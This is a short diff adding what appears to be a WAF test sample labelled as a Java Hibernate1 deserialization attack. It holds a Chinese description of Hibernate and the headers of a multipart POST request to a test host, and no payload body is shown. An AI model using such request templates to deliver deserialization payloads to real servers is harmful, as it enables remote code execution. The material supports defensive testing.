@@ -1,0 +1,10 @@
+# 反序列化-JAVA Hibernate1
+# Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，它将POJO与数据库表建立映射关系，是一个全自动的orm框架，hibernate可以自动生成SQL语句，自动执行，使得Java程序员可以随心所欲的使用对象编程思维来操纵数据库。
+POST /?acid=80001737&bid=hd_tag_m8mv25nb HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25nb
+RM-PRO-Token: 57d45ec2ebd130cebac53c3082d1f97c
+RM-PRO-Time: 1742808484133
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=-chvi3QHqy18J0Cx7pOFrk87Md1zWNQO
+
